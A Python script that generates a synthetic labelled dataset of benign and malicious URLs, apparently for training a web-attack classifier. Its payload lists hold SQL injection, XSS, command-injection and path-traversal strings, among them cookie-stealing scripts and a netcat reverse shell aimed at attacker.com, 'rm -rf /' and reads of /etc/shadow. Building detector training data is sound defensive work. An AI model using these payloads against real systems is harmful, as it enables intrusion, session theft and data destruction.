
# utils/dummy_data.py
import csv
import random
import urllib.parse

def generate_large_dataset(filename="enhanced_training_data.csv", size=5000):
    """Generate a large, diverse dataset for training"""
    
    # Benign URL patterns
    benign_domains = [
        "example.com", "google.com", "github.com", "stackoverflow.com", "wikipedia.org",
        "amazon.com", "netflix.com", "youtube.com", "facebook.com", "twitter.com",
        "linkedin.com", "instagram.com", "reddit.com", "medium.com", "news.bbc.co.uk"
    ]
    
    benign_paths = [
        "/home", "/about", "/contact", "/products", "/services", "/blog", "/news",
        "/api/v1/users", "/api/data", "/dashboard", "/profile", "/settings",
        "/images/photo.jpg", "/css/style.css", "/js/app.js", "/download/file.pdf"
    ]
    
    benign_params = [
        "?page=1", "?category=books", "?search=python", "?lang=en", "?sort=date",
        "?user_id=123", "?limit=10", "?offset=0", "?format=json", "?version=2.0"
    ]
    
    # SQL Injection patterns
    sqli_patterns = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users;--",
        "admin'--",
        "' OR 'a'='a",
        "1' ORDER BY 1--",
        "' UNION ALL SELECT NULL--",
        "' AND SUBSTRING(@@version,1,1)='5",
        "'; EXEC xp_cmdshell('dir');--",
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' HAVING 1=1--",
        "' GROUP BY 1--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' WAITFOR DELAY '00:00:05'--"
    ]
    
    # XSS patterns
    xss_patterns = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<input type=text onclick=alert('XSS')>",
        "<script>window.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<script>document.write('<img src=http://attacker.com/steal.php?cookie='+document.cookie+'>')</script>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<script>prompt('XSS')</script>",
        "<object data=javascript:alert('XSS')>"
    ]
    
    # Command injection patterns
    cmd_patterns = [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "`whoami`",
        "$(id)",
        "; rm -rf /",
        "| nc -e /bin/sh attacker.com 4444",
        "; ping -c 1 127.0.0.1",
        "& net user",
        "`cat /etc/shadow`"
    ]
    
    # Directory traversal patterns
    traversal_patterns = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ]
    
    all_urls = []
    
    # Generate benign URLs
    benign_count = size // 2
    for _ in range(benign_count):
        domain = random.choice(benign_domains)
        path = random.choice(benign_paths)
        param = random.choice(benign_params) if random.random() > 0.3 else ""
        
        # Add some variation
        if random.random() > 0.7:
            param += f"&timestamp={random.randint(1000000000, 9999999999)}"
        
        protocol = "https" if random.random() > 0.2 else "http"
        url = f"{protocol}://{domain}{path}{param}"
        all_urls.append((url, 0))
    
    # Generate malicious URLs
    malicious_count = size - benign_count
    attack_types = [sqli_patterns, xss_patterns, cmd_patterns, traversal_patterns]
    
    for _ in range(malicious_count):
        attack_type = random.choice(attack_types)
        pattern = random.choice(attack_type)
        domain = random.choice(benign_domains)
        
        # Create malicious URL
        if random.random() > 0.5:
            # Parameter-based attack
            param_name = random.choice(['q', 'search', 'id', 'user', 'input', 'data'])
            encoded_pattern = urllib.parse.quote(pattern) if random.random() > 0.3 else pattern
            url = f"http://{domain}/search?{param_name}={encoded_pattern}"
        else:
            # Path-based attack
            path = random.choice(benign_paths)
            url = f"http://{domain}{path}/{pattern}"
        
        all_urls.append((url, 1))
    
    # Add some mixed/complex attacks
    complex_count = size // 10
    for _ in range(complex_count):
        # Combine multiple attack types
        sql_part = random.choice(sqli_patterns[:5])
        xss_part = random.choice(xss_patterns[:5])
        domain = random.choice(benign_domains)
        
        complex_attack = f"http://{domain}/login?user={sql_part}&comment={urllib.parse.quote(xss_part)}"
        all_urls.append((complex_attack, 1))
    
    # Shuffle the dataset
    random.shuffle(all_urls)
    
    # Write to CSV
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['url', 'label'])
        writer.writerows(all_urls)
    
    benign_final = len([x for x in all_urls if x[1] == 0])
    malicious_final = len([x for x in all_urls if x[1] == 1])
    
    print(f"✅ Generated {len(all_urls)} URLs:")
    print(f"   🟢 Benign: {benign_final}")
    print(f"   🔴 Malicious: {malicious_final}")
    print(f"   💾 Saved to: {filename}")

if __name__ == "__main__":
    generate_large_dataset()
